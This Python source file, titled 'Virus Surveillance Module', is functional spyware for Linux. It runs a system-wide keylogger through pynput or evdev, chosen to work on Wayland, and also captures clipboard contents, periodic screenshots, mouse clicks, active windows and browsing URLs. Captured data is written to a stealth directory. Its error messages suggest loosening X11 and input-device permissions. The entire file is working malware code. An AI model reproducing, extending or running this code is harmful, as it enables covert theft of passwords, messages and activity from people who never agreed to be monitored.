"""
Virus Surveillance Module - Keylogging, Mouse, Clipboard, Screenshots, Windows
"""
import os
import time
import subprocess
import re
import threading

try:
    from pynput import keyboard
    from pynput import mouse
    PYNPUT_AVAILABLE = True
    MOUSE_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False
    MOUSE_AVAILABLE = False

try:
    import evdev
    from evdev import ecodes
    EVDEV_AVAILABLE = True
except ImportError:
    EVDEV_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    from PIL import ImageGrab
    SCREENSHOT_AVAILABLE = True
    SCREENSHOT_METHOD = 'PIL'
except ImportError:
    SCREENSHOT_AVAILABLE = False
    SCREENSHOT_METHOD = None

try:
    import pyperclip
    CLIPBOARD_AVAILABLE = True
except ImportError:
    CLIPBOARD_AVAILABLE = False

# Try alternative screenshot method
if not SCREENSHOT_AVAILABLE:
    try:
        result = subprocess.run(['which', 'scrot'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        if result.returncode == 0:
            SCREENSHOT_AVAILABLE = True
            SCREENSHOT_METHOD = 'scrot'
        else:
            result = subprocess.run(['which', 'gnome-screenshot'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
            if result.returncode == 0:
                SCREENSHOT_AVAILABLE = True
                SCREENSHOT_METHOD = 'gnome-screenshot'
    except:
        pass

from virus_config import *
from virus_utils import log_activity

# Global variables
keylogger_listener = None
keylogger_running = False
evdev_keylogger_thread = None
evdev_keylogger_devices = []
window_monitor_running = False
last_active_window = None
last_active_app = None
last_url = None
last_clipboard_content = ""
mouse_listener = None

def log_key_press(key_name, source="system"):
    """Log keyboard input"""
    from datetime import datetime
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    log_entry = f"[{timestamp}] [{source.upper()}] Key Pressed: {key_name}\n"
    
    try:
        log_path = f"{DATA_DIR}/{LOG_FILE}" if ENABLE_STEALTH and os.path.exists(DATA_DIR) else LOG_FILE
        with open(log_path, "a", encoding="utf-8") as log_file:
            log_file.write(log_entry)
            log_file.flush()
        # Activity already logged via log_key_press, no need to duplicate
    except Exception as e:
        # Try to log the error
        try:
            log_activity("ERROR", f"Failed to log key press '{key_name}': {e}")
        except:
            # If even that fails, try stderr
            try:
                import sys
                sys.stderr.write(f"CRITICAL: Failed to log key press: {e}\n")
            except:
                pass

def on_press_system(key):
    """Callback for system-wide keylogger - captures ALL keyboard input"""
    try:
        # Handle different key types
        if hasattr(key, 'char') and key.char is not None:
            # Regular character key (a-z, 0-9, etc.)
            key_name = key.char
        elif hasattr(key, 'name'):
            # Special key (space, enter, shift, etc.)
            key_name = key.name.upper()
            # Normalize some common key names
            if key_name == 'SPACE':
                key_name = 'SPACE'
            elif key_name == 'ENTER':
                key_name = 'ENTER'
            elif key_name == 'BACKSPACE':
                key_name = 'BACKSPACE'
            elif key_name == 'TAB':
                key_name = 'TAB'
            elif key_name == 'ESC' or key_name == 'ESCAPE':
                key_name = 'ESC'
            elif key_name == 'CMD' or key_name == 'CMD_L' or key_name == 'CMD_R':
                key_name = 'CMD'
            elif key_name == 'CTRL' or key_name == 'CTRL_L' or key_name == 'CTRL_R':
                key_name = 'CTRL'
            elif key_name == 'ALT' or key_name == 'ALT_L' or key_name == 'ALT_R':
                key_name = 'ALT'
            elif key_name == 'SHIFT' or key_name == 'SHIFT_L' or key_name == 'SHIFT_R':
                key_name = 'SHIFT'
        else:
            # Fallback: convert key object to string
            key_str = str(key)
            if key_str.startswith("Key."):
                key_name = key_str.replace("Key.", "").upper()
            else:
                key_name = key_str.replace("'", "")
        
        # Log the key press immediately (non-blocking)
        try:
            log_key_press(key_name, source="system")
        except Exception as log_err:
            # If logging fails, try to log the error but don't block
            try:
                log_activity("ERROR", f"Failed to log key '{key_name}': {log_err}")
            except:
                pass
        
    except Exception as e:
        # Log error but don't crash - keylogger must keep running
        try:
            import traceback
            error_msg = f"Keylogger callback error: {e}\n{traceback.format_exc()[:300]}"
            log_activity("ERROR", error_msg)
            # Also try to write to a separate error log
            try:
                error_log_path = f"{DATA_DIR}/keylogger_errors.log" if ENABLE_STEALTH and os.path.exists(DATA_DIR) else "keylogger_errors.log"
                with open(error_log_path, "a", encoding="utf-8") as err_file:
                    err_file.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {error_msg}\n")
            except:
                pass
        except:
            # If even error logging fails, try to write to stderr as last resort
            try:
                import sys
                sys.stderr.write(f"CRITICAL: Keylogger error logging failed: {e}\n")
            except:
                pass

def on_release_system(key):
    """Callback for key release (optional, for completeness)"""
    # We only log presses, but this keeps the listener active
    pass

def keylogger_worker():
    """Worker thread to keep keylogger running and monitor its status"""
    global keylogger_listener, keylogger_running
    
    try:
        # Keep the listener alive and monitor its status
        if keylogger_listener:
            # Join will block until listener stops, keeping it alive
            keylogger_listener.join()
        else:
            # If listener is None, something went wrong
            log_activity("ERROR", "Keylogger worker: listener is None")
            keylogger_running = False
    except Exception as e:
        log_activity("ERROR", f"Keylogger worker error: {e}")
        keylogger_running = False
        keylogger_listener = None

def evdev_keylogger_worker(device_path):
    """Worker thread to monitor a single keyboard device using evdev"""
    global keylogger_running
    
    device = None
    try:
        device = evdev.InputDevice(device_path)
        # Don't grab - just read events (grab would block keyboard for user)
        # device.grab()  # Commented out - would block keyboard
        
        log_activity("SYSTEM", f"Evdev keylogger monitoring device: {device.name} ({device_path})")
        
        for event in device.read_loop():
            if not keylogger_running:
                break
                
            if event.type == ecodes.EV_KEY:
                key_event = evdev.categorize(event)
                
                # Only log key presses (value 1), not releases (value 0)
                if event.value == 1:
                    try:
                        # Get key name
                        key_name = key_event.keycode
                        if isinstance(key_name, list):
                            key_name = key_name[0] if key_name else "UNKNOWN"
                        
                        # Normalize key names
                        key_name = key_name.replace("KEY_", "").upper()
                        
                        # Map common keys
                        key_mapping = {
                            "SPACE": "SPACE",
                            "ENTER": "ENTER",
                            "BACKSPACE": "BACKSPACE",
                            "TAB": "TAB",
                            "ESC": "ESC",
                            "LEFTCTRL": "CTRL",
                            "RIGHTCTRL": "CTRL",
                            "LEFTALT": "ALT",
                            "RIGHTALT": "ALT",
                            "LEFTSHIFT": "SHIFT",
                            "RIGHTSHIFT": "SHIFT",
                            "LEFTMETA": "CMD",
                            "RIGHTMETA": "CMD",
                        }
                        
                        if key_name in key_mapping:
                            key_name = key_mapping[key_name]
                        
                        # Log the key press
                        log_key_press(key_name, source="evdev")
                    except Exception as e:
                        # Don't crash on individual key errors
                        pass
                        
    except PermissionError:
        log_activity("ERROR", f"Permission denied for device {device_path}. May need to add user to input group: sudo usermod -a -G input $USER")
    except OSError as e:
        log_activity("ERROR", f"Device {device_path} error: {e}")
    except Exception as e:
        log_activity("ERROR", f"Evdev keylogger error for {device_path}: {e}")
    finally:
        if device:
            try:
                # Only ungrab if we grabbed
                # device.ungrab()
                pass
            except:
                pass

def start_evdev_keylogger():
    """Start keylogger using evdev (alternative method for Wayland)"""
    global evdev_keylogger_thread, evdev_keylogger_devices, keylogger_running
    
    if not EVDEV_AVAILABLE:
        log_activity("ERROR", "evdev not available - evdev keylogger disabled")
        return False
    
    if not SYSTEM_WIDE_LOGGING:
        return False
    
    try:
        log_activity("SYSTEM", "Starting evdev keylogger...")
        
        # Find all keyboard devices
        devices = []
        for device_path in evdev.list_devices():
            try:
                device = evdev.InputDevice(device_path)
                # Check if device has keyboard capabilities
                if ecodes.EV_KEY in device.capabilities():
                    # Filter out non-keyboard devices (like mice, touchpads)
                    caps = device.capabilities()[ecodes.EV_KEY]
                    # Check if it has letter keys (KEY_A) or number keys (KEY_1)
                    has_keys = any(k in caps for k in [ecodes.KEY_A, ecodes.KEY_1, ecodes.KEY_SPACE, ecodes.KEY_ENTER])
                    if has_keys:
                        devices.append(device_path)
            except (PermissionError, OSError):
                continue
        
        if not devices:
            log_activity("ERROR", "No keyboard devices found for evdev keylogger")
            return False
        
        log_activity("SYSTEM", f"Found {len(devices)} keyboard device(s) for evdev keylogger")
        
        # Start monitoring each device in a separate thread
        evdev_keylogger_devices = []
        for device_path in devices[:3]:  # Limit to 3 devices to avoid too many threads
            try:
                thread = threading.Thread(
                    target=evdev_keylogger_worker,
                    args=(device_path,),
                    daemon=True
                )
                thread.start()
                evdev_keylogger_devices.append(thread)
            except Exception as e:
                log_activity("ERROR", f"Failed to start evdev keylogger for {device_path}: {e}")
        
        if evdev_keylogger_devices:
            log_activity("SYSTEM", f"Evdev keylogger started - monitoring {len(evdev_keylogger_devices)} device(s)")
            return True
        else:
            log_activity("ERROR", "Failed to start evdev keylogger on any device")
            return False
            
    except Exception as e:
        log_activity("ERROR", f"Failed to start evdev keylogger: {e}")
        return False

def start_system_keylogger():
    """Start system-wide keylogger - tries evdev first on Wayland, then pynput"""
    global keylogger_listener, keylogger_running
    
    if not SYSTEM_WIDE_LOGGING:
        log_activity("SYSTEM", "System-wide logging disabled in config")
        return
    
    if keylogger_running:
        log_activity("SYSTEM", "Keylogger already running")
        return
    
    # Detect if we're on Wayland
    is_wayland = os.environ.get('XDG_SESSION_TYPE') == 'wayland' or os.environ.get('WAYLAND_DISPLAY')
    
    # On Wayland, prefer evdev; on X11, prefer pynput
    if is_wayland and EVDEV_AVAILABLE:
        log_activity("SYSTEM", "Wayland detected - using evdev keylogger")
        keylogger_running = True
        if start_evdev_keylogger():
            return
        else:
            log_activity("SYSTEM", "Evdev keylogger failed, trying pynput as fallback...")
            keylogger_running = False
    
    # Try pynput (works better on X11, may work on Wayland with permissions)
    if not PYNPUT_AVAILABLE:
        # If pynput not available, try evdev as fallback
        if EVDEV_AVAILABLE:
            log_activity("SYSTEM", "pynput not available - trying evdev keylogger")
            keylogger_running = True
            if start_evdev_keylogger():
                return
        log_activity("ERROR", "Neither pynput nor evdev available - keylogger disabled")
        return
    
    try:
        log_activity("SYSTEM", "Starting system-wide keylogger...")
        
        # Create listener with both press and release callbacks
        # suppress=False means we don't block the keys, just monitor them
        keylogger_listener = keyboard.Listener(
            on_press=on_press_system,
            on_release=on_release_system,
            suppress=False
        )
        
        # Start the listener
        keylogger_listener.start()
        keylogger_running = True
        
        # Give it time to initialize
        time.sleep(0.5)
        
        # Verify it's running
        if keylogger_listener.is_alive():
            log_activity("SYSTEM", "Keylogger started successfully - capturing ALL keyboard input")
            log_activity("SYSTEM", "Keylogger is monitoring system-wide (not just terminal)")
            
            # Start worker thread to keep listener alive
            keylogger_thread = threading.Thread(target=keylogger_worker, daemon=True)
            keylogger_thread.start()
            
            # Test that it's actually working by logging a test entry
            log_activity("SYSTEM", "Keylogger test: If you see this, keylogger is active")
            log_activity("SYSTEM", "Press any key to test - it should appear in the log")
        else:
            log_activity("ERROR", "Keylogger failed to start - listener not alive")
            keylogger_running = False
            keylogger_listener = None
            # Try evdev as fallback
            if EVDEV_AVAILABLE:
                log_activity("SYSTEM", "Trying evdev keylogger as fallback...")
                if start_evdev_keylogger():
                    keylogger_running = True
                    return
            
    except Exception as e:
        log_activity("ERROR", f"Failed to start pynput keylogger: {e}")
        keylogger_running = False
        keylogger_listener = None
        # Try to get more details about the error
        import traceback
        error_details = traceback.format_exc()
        log_activity("ERROR", f"Keylogger error details: {error_details[:200]}")
        
        # Try evdev as fallback
        if EVDEV_AVAILABLE:
            log_activity("SYSTEM", "Trying evdev keylogger as fallback...")
            if start_evdev_keylogger():
                keylogger_running = True
                return
        
        # On Linux, might need X11 permissions
        log_activity("ERROR", "Note: On Linux, keylogger may need X11 access permissions")
        log_activity("ERROR", "Try running with: xhost +local: or check DISPLAY variable")
        log_activity("ERROR", "On Wayland, may need to add user to input group: sudo usermod -a -G input $USER")

def stop_system_keylogger():
    """Stop system-wide keylogger"""
    global keylogger_listener, keylogger_running
    if keylogger_listener and keylogger_running:
        try:
            keylogger_listener.stop()
            keylogger_running = False
        except:
            pass

def monitor_clipboard():
    """Monitor clipboard for changes"""
    global last_clipboard_content
    
    if not CLIPBOARD_AVAILABLE or not ENABLE_CLIPBOARD_MONITORING:
        return
    
    last_clipboard_content = ""
    while True:
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard and current_clipboard != last_clipboard_content:
                display_content = current_clipboard[:200] + "..." if len(current_clipboard) > 200 else current_clipboard
                log_activity("CLIPBOARD", f"Content copied: {repr(display_content)}")
                last_clipboard_content = current_clipboard
            time.sleep(CLIPBOARD_CHECK_INTERVAL)
        except:
            time.sleep(CLIPBOARD_CHECK_INTERVAL)

def take_screenshot():
    """Take periodic screenshots"""
    if not SCREENSHOT_AVAILABLE or not ENABLE_SCREENSHOTS:
        return
    
    try:
        screenshot_dir = f"{DATA_DIR}/{SCREENSHOT_DIR}" if ENABLE_STEALTH and os.path.exists(DATA_DIR) else SCREENSHOT_DIR
        os.makedirs(screenshot_dir, exist_ok=True)
    except:
        pass
    
    screenshot_count = 0
    while True:
        try:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            screenshot_path = f"{screenshot_dir}/screenshot_{timestamp}_{screenshot_count}.png"
            
            if SCREENSHOT_METHOD == 'PIL':
                screenshot = ImageGrab.grab()
                screenshot.save(screenshot_path)
            elif SCREENSHOT_METHOD == 'scrot':
                subprocess.run(['scrot', '-q', '80', screenshot_path], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            elif SCREENSHOT_METHOD == 'gnome-screenshot':
                subprocess.run(['gnome-screenshot', '-f', screenshot_path], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
            
            if os.path.exists(screenshot_path):
                log_activity("SCREENSHOT", f"Screenshot saved: {screenshot_path}")
                screenshot_count += 1
            
            time.sleep(SCREENSHOT_INTERVAL)
        except:
            time.sleep(SCREENSHOT_INTERVAL)

def on_mouse_click(x, y, button, pressed):
    """Track mouse clicks"""
    if not MOUSE_AVAILABLE or not ENABLE_MOUSE_TRACKING:
        return
    
    try:
        button_name = str(button).replace("Button.", "")
        action = "PRESSED" if pressed else "RELEASED"
        log_activity("MOUSE", f"{action} {button_name} at ({x}, {y})")
    except:
        pass

def start_mouse_monitor():
    """Start mouse monitoring"""
    global mouse_listener
    
    if not MOUSE_AVAILABLE or not ENABLE_MOUSE_TRACKING:
        return None
    
    try:
        mouse_listener = mouse.Listener(on_click=on_mouse_click)
        mouse_listener.start()
        return mouse_listener
    except:
        return None

def get_active_window_info():
    """Get active window title and application name"""
    window_title = None
    app_name = None
    
    # Detect display server (Wayland or X11)
    is_wayland = os.environ.get('XDG_SESSION_TYPE') == 'wayland' or os.environ.get('WAYLAND_DISPLAY')
    is_hyprland = False
    
    # Check if Hyprland is available
    if is_wayland:
        try:
            result = subprocess.run(['which', 'hyprctl'], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=0.5)
            is_hyprland = result.returncode == 0
        except:
            pass
    
    # Method 1: Use Hyprland (Wayland)
    if is_hyprland:
        try:
            result = subprocess.run(
                ['hyprctl', 'activewindow', '-j'],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
                timeout=0.5
            )
            if result.returncode == 0 and result.stdout.strip():
                try:
                    import json
                    window_data = json.loads(result.stdout.strip())
                    if window_data:
                        window_title = window_data.get('title', '')
                        app_name = window_data.get('class', '') or window_data.get('initialClass', '')
                        
                        # If we got both, return immediately
                        if window_title or app_name:
                            return window_title, app_name or "Unknown"
                except (json.JSONDecodeError, KeyError):
                    pass
        except:
            pass
    
    # Method 2: Use xprop (X11 - most reliable for app name on Linux)
    try:
        result = subprocess.run(
            ['xprop', '-root', '_NET_ACTIVE_WINDOW'],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            timeout=0.5
        )
        if result.returncode == 0:
            match = re.search(r'0x[0-9a-f]+', result.stdout, re.IGNORECASE)
            if match:
                window_id = match.group(0)
                
                # Get window title
                result2 = subprocess.run(
                    ['xprop', '-id', window_id, 'WM_NAME'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True,
                    timeout=0.5
                )
                if result2.returncode == 0:
                    # Try UTF8_STRING first, then STRING
                    match2 = re.search(r'WM_NAME\(UTF8_STRING\) = "(.+)"', result2.stdout)
                    if not match2:
                        match2 = re.search(r'WM_NAME\(STRING\) = "(.+)"', result2.stdout)
                    if match2:
                        window_title = match2.group(1)
                
                # Get application name from WM_CLASS (most reliable)
                result3 = subprocess.run(
                    ['xprop', '-id', window_id, 'WM_CLASS'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True,
                    timeout=0.5
                )
                if result3.returncode == 0 and result3.stdout.strip():
                    # WM_CLASS format: "instance", "class" - we want the class (second value)
                    # Format is: WM_CLASS(STRING) = "instance", "class"
                    wm_class_output = result3.stdout.strip()
                    match3 = re.search(r'WM_CLASS\(STRING\) = "([^"]+)",\s*"([^"]+)"', wm_class_output)
                    if match3:
                        # Use the class name (second captured group), which is usually the app name
                        app_name = match3.group(2)
                    else:
                        # Try alternative format: WM_CLASS(STRING) = "value"
                        match3_single = re.search(r'WM_CLASS\(STRING\) = "([^"]+)"', wm_class_output)
                        if match3_single:
                            app_name = match3_single.group(1)
                        # Also try WM_CLASS without STRING
                        if not app_name:
                            match3_alt = re.search(r'WM_CLASS\s*=\s*"([^"]+)",\s*"([^"]+)"', wm_class_output)
                            if match3_alt:
                                app_name = match3_alt.group(2)
                            elif not app_name:
                                match3_alt2 = re.search(r'WM_CLASS\s*=\s*"([^"]+)"', wm_class_output)
                                if match3_alt2:
                                    app_name = match3_alt2.group(1)
                
                # Also try _NET_WM_NAME for better title support
                if not window_title:
                    result4 = subprocess.run(
                        ['xprop', '-id', window_id, '_NET_WM_NAME'],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.DEVNULL,
                        text=True,
                        timeout=0.5
                    )
                    if result4.returncode == 0:
                        match4 = re.search(r'_NET_WM_NAME\(UTF8_STRING\) = "(.+)"', result4.stdout)
                        if match4:
                            window_title = match4.group(1)
                
                if window_title or app_name:
                    return window_title, app_name or "Unknown"
    except Exception as e:
        pass
    
    # Method 2: Use xdotool as fallback
    try:
        result = subprocess.run(
            ['xdotool', 'getactivewindow', 'getwindowname'],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            timeout=0.5
        )
        if result.returncode == 0 and result.stdout.strip():
            if not window_title:
                window_title = result.stdout.strip()
            
            # Try to get window class name
            if not app_name:
                try:
                    result3 = subprocess.run(
                        ['xdotool', 'getactivewindow', 'getwindowclassname'],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.DEVNULL,
                        text=True,
                        timeout=0.5
                    )
                    if result3.returncode == 0 and result3.stdout.strip():
                        app_name = result3.stdout.strip()
                except:
                    pass
            
            # Try to get from process (only if WM_CLASS didn't work)
            # Note: This is less reliable as it may get child processes
            if not app_name:
                try:
                    result2 = subprocess.run(
                        ['xdotool', 'getactivewindow', 'getwindowpid'],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.DEVNULL,
                        text=True,
                        timeout=0.5
                    )
                    if result2.returncode == 0 and result2.stdout.strip():
                        pid_str = result2.stdout.strip()
                        if pid_str.isdigit():
                            pid = int(pid_str)
                            if PSUTIL_AVAILABLE:
                                try:
                                    process = psutil.Process(pid)
                                    # Try to get better app name by checking parent process chain
                                    try:
                                        # Get executable path and extract app name
                                        exe_path = process.exe()
                                        if exe_path:
                                            app_name = os.path.basename(exe_path)
                                            # Remove common suffixes
                                            app_name = app_name.replace('.bin', '').replace('.exe', '')
                                        
                                        # If we got a generic name, walk up parent process chain
                                        generic_names = ['python', 'python3', 'sh', 'bash', 'node', 'electron', 'cursor']
                                        max_depth = 5
                                        depth = 0
                                        current_process = process
                                        
                                        while app_name.lower() in generic_names and depth < max_depth:
                                            try:
                                                parent = current_process.parent()
                                                if parent:
                                                    parent_exe = parent.exe()
                                                    if parent_exe:
                                                        parent_name = os.path.basename(parent_exe).replace('.bin', '').replace('.exe', '')
                                                        if parent_name.lower() not in generic_names:
                                                            app_name = parent_name
                                                            break
                                                        current_process = parent
                                                        depth += 1
                                                    else:
                                                        break
                                                else:
                                                    break
                                            except:
                                                break
                                    except:
                                        # Fallback to process name
                                        app_name = process.name()
                                    
                                    # For some apps, try to get better name from cmdline
                                    try:
                                        cmdline = process.cmdline()
                                        if cmdline:
                                            # Look for executable name in cmdline
                                            for arg in cmdline:
                                                if arg and '/' in arg:
                                                    exe_name = os.path.basename(arg)
                                                    if exe_name and exe_name.lower() not in ['python', 'python3', 'sh', 'bash', 'node', 'cursor']:
                                                        app_name = exe_name
                                                        break
                                    except:
                                        pass
                                except:
                                    pass
                except:
                    pass
            
            # Last resort: Try to infer app name from window title
            if not app_name and window_title:
                # Common patterns in window titles
                title_lower = window_title.lower()
                if 'firefox' in title_lower:
                    app_name = 'Firefox'
                elif 'chrome' in title_lower or 'chromium' in title_lower:
                    app_name = 'Chrome'
                elif 'brave' in title_lower:
                    app_name = 'Brave'
                elif 'terminal' in title_lower or 'konsole' in title_lower or 'gnome-terminal' in title_lower:
                    app_name = 'Terminal'
                elif 'code' in title_lower and 'cursor' not in title_lower:
                    app_name = 'VSCode'
                elif 'gedit' in title_lower:
                    app_name = 'Gedit'
                elif 'libreoffice' in title_lower:
                    app_name = 'LibreOffice'
                elif 'thunderbird' in title_lower:
                    app_name = 'Thunderbird'
                elif 'discord' in title_lower:
                    app_name = 'Discord'
                elif 'slack' in title_lower:
                    app_name = 'Slack'
                elif 'telegram' in title_lower:
                    app_name = 'Telegram'
                elif 'spotify' in title_lower:
                    app_name = 'Spotify'
                elif 'vlc' in title_lower:
                    app_name = 'VLC'
                elif 'gimp' in title_lower:
                    app_name = 'GIMP'
                elif 'inkscape' in title_lower:
                    app_name = 'Inkscape'
                elif 'blender' in title_lower:
                    app_name = 'Blender'
            
            if window_title or app_name:
                return window_title, app_name or "Unknown"
    except:
        pass
    
    return window_title, app_name

def extract_url_from_title(title):
    """Extract URL from browser window title"""
    if not title:
        return None
    
    url_patterns = [
        r'https?://[^\s]+',
        r'www\.[^\s]+',
        r'[a-zA-Z0-9-]+\.[a-zA-Z]{2,}',
    ]
    
    for pattern in url_patterns:
        match = re.search(pattern, title)
        if match:
            url = match.group(0)
            url = re.sub(r'[^\w\.\-\:\/].*$', '', url)
            return url
    
    return None

def log_window_change(window_title, app_name, url=None):
    """Log window/application change"""
    from datetime import datetime
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    log_entry = f"[{timestamp}] [WINDOW] Application: {app_name or 'Unknown'}"
    if window_title:
        log_entry += f" | Window: {window_title}"
    if url:
        log_entry += f" | URL: {url}"
    log_entry += "\n"
    
    try:
        log_path = f"{DATA_DIR}/{LOG_FILE}" if ENABLE_STEALTH and os.path.exists(DATA_DIR) else LOG_FILE
        with open(log_path, "a", encoding="utf-8") as log_file:
            log_file.write(log_entry)
            log_file.flush()
        
        activity_details = f"Switched to: {app_name or 'Unknown'}"
        if window_title:
            activity_details += f" | Window: {window_title}"
        if url:
            activity_details += f" | Visiting: {url}"
        log_activity("APPLICATION", activity_details)
    except:
        pass

def monitor_windows():
    """Monitor active window changes"""
    global window_monitor_running, last_active_window, last_active_app, last_url
    
    window_monitor_running = True
    
    while window_monitor_running:
        try:
            window_title, app_name = get_active_window_info()
            
            if window_title or app_name:
                if window_title != last_active_window or app_name != last_active_app:
                    url = None
                    
                    if app_name and any(browser in app_name.lower() for browser in ['chrome', 'firefox', 'brave', 'edge', 'opera', 'vivaldi', 'chromium', 'safari', 'librewolf', 'waterfox']):
                        url = extract_url_from_title(window_title)
                    
                    log_window_change(window_title, app_name, url)
                    last_active_window = window_title
                    last_active_app = app_name
                    if url:
                        last_url = url
                else:
                    if app_name and any(browser in app_name.lower() for browser in ['chrome', 'firefox', 'brave', 'edge', 'opera', 'vivaldi', 'chromium', 'safari', 'librewolf', 'waterfox']):
                        url = extract_url_from_title(window_title)
                        if url and url != last_url:
                            log_window_change(window_title, app_name, url)
                            last_url = url
            
            time.sleep(1)
        except:
            time.sleep(1)

def start_window_monitor():
    """Start window monitoring"""
    global window_monitor_running
    
    if window_monitor_running:
        return
    
    try:
        monitor_thread = threading.Thread(target=monitor_windows, daemon=True)
        monitor_thread.start()
    except:
        pass

def stop_window_monitor():
    """Stop window monitoring"""
    global window_monitor_running
    window_monitor_running = False

def get_system_info():
    """Get system information"""
    info = []
    try:
        if PSUTIL_AVAILABLE:
            cpu_percent = psutil.cpu_percent(interval=1)
            info.append(f"CPU: {cpu_percent}%")
            
            memory = psutil.virtual_memory()
            info.append(f"Memory: {memory.percent}% used")
            
            disk = psutil.disk_usage('/')
            info.append(f"Disk: {disk.percent}% used")
            
            connections = len(psutil.net_connections())
            info.append(f"Network connections: {connections}")
    except:
        pass
    
    return " | ".join(info) if info else "System info unavailable"

def monitor_system_activity():
    """Monitor system activity periodically"""
    while True:
        try:
            system_info = get_system_info()
            if system_info:
                log_activity("SYSTEM", system_info)
            time.sleep(60)
        except:
            time.sleep(60)

